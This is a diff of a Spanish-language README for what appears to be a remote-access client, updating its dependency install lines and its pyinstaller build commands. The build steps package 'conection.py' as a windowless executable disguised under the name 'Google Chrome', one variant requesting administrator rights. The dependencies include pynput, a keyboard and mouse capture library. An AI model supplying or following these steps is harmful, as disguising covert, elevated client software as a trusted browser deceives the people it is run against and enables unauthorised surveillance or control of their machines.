@@ -84,13 +84,13 @@ Automated:
 
 Manal:
 
-- ```pip install prompt_toolkit==3.0.14 colorama==0.4.4 psutil==5.8.0 cryptography==41.0.3 requests==2.31.0 pillow==10.0.1 pynput==1.7.6```
+- ```pip install prompt_toolkit colorama psutil cryptography requests pillow pynput pyinstaller```
 
 
 # Errors:
 
 - Si tenemos errores con las librerias (module not found):
-  - ```pip install prompt_toolkit==3.0.14 colorama==0.4.4 psutil==5.8.0 cryptography==41.0.3 requests==2.31.0 pillow==10.0.1 pynput==1.7.6 pyinstaller==0.5.9``` 
+  - ````pip install prompt_toolkit colorama psutil cryptography requests pillow pynput pyinstaller``` 
 
 
 - Si tenemos el error **"pyinstaller not found"** en el *nuevo entorno*!
@@ -123,18 +123,18 @@ Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio
 - Tenemos varias opciones: (Accedemos a la carpeta CLIENT)
 
   ### Automatic
-    - `client>pyinstaller compilation.spec`
+    - `client>pyinstaller Compilation.spec`
 
   ### Windows:
 
   - Admin Required:
   
-      `client>pyinstaller --onefile --noupx --noconsole --clean --uac-admin -n "Google Chrome" conection.py`
+      `client>pyinstaller --onefile --clean --noconsole --noupx --strip --uac-admin -n "Google Chrome" conection.py`
 
   - **NO** Admin Required:
   
-      `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
+      `client>pyinstaller --onefile --clean --noconsole --noupx --strip -n "Google Chrome" conection.py`
 
   ### Linux:
   
-  `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
+  `client>pyinstaller --onefile --clean --noconsole --noupx --strip -n "Google Chrome" conection.py`
